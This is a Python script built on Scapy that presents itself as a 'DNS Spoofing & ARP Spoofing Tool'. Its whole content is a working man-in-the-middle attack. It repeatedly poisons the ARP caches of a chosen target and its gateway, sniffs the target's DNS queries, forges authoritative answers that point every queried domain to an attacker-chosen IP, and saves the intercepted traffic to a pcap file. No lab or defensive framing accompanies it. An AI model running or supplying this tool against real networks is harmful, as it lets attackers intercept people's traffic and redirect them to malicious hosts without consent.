from scapy.all import *
import logging
import sys
import time
from threading import Thread, Event

# Suppress Scapy warnings and runtime logs
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

# Get user input sequentially
print("=== DNS Spoofing & ARP Spoofing Tool ===\n")
target_ip = input("[?] Enter Target IP Address: ").strip()
gateway_ip = input("[?] Enter Gateway IP Address: ").strip()
iface = input("[?] Enter Network Interface (e.g., wlan0): ").strip()
spoofed_ip = input("[?] Enter IP to Redirect DNS Requests To: ").strip()
pcap_file = "dns_spoofed_traffic.pcap"

# Get MAC address for a given IP
def get_mac(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None

# ARP Spoofing
def spoof(target_ip, target_mac, spoof_ip, iface):
    if not target_mac:
        print(f"[ERROR] Can't find MAC for {target_ip}.")
        return False
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=iface)
    return True

# Restore ARP
def restore(dest_ip, dest_mac, source_ip, source_mac, iface):
    if not dest_mac or not source_mac:
        print(f"[ERROR] Can't restore ARP for {dest_ip} or {source_ip}.")
        return
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, iface=iface)

# DNS Spoofing
def process_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        requested_domain = packet[DNSQR].qname.decode()
        print(f"[*] Intercepted DNS Request for: {requested_domain}")
        if packet.haslayer(IP) and packet.haslayer(UDP):
            spoofed_packet = (
                IP(dst=packet[IP].src, src=packet[IP].dst) /
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                    an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip))
            )
            send(spoofed_packet, iface=iface)
            print(f"[*] Spoofed DNS Response Sent to {packet[IP].src} for {requested_domain}")

# Packet capture
def capture_packets(stop_event, iface, pcap_file):
    print(f"[*] Capturing DNS traffic on {iface}...")
    packets = sniff(prn=process_packet, stop_filter=lambda _: stop_event.is_set(), iface=iface, store=True)
    wrpcap(pcap_file, packets)

# Main Execution
stop_event = Event()

try:
    target_mac = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not target_mac or not gateway_mac:
        print("[ERROR] Could not retrieve required MAC addresses. Exiting.")
        sys.exit(1)

    # Start DNS capture
    capture_thread = Thread(target=capture_packets, args=(stop_event, iface, pcap_file))
    capture_thread.start()

    print("\n[*] Starting ARP spoofing. Press Ctrl+C to stop...\n")
    while True:
        spoof(target_ip, target_mac, gateway_ip, iface)
        spoof(gateway_ip, gateway_mac, target_ip, iface)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C! Restoring network...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac, iface)
    restore(gateway_ip, gateway_mac, target_ip, target_mac, iface)
    stop_event.set()
    capture_thread.join()
    print(f"[+] Spoofing stopped. Packets saved to: {pcap_file}")
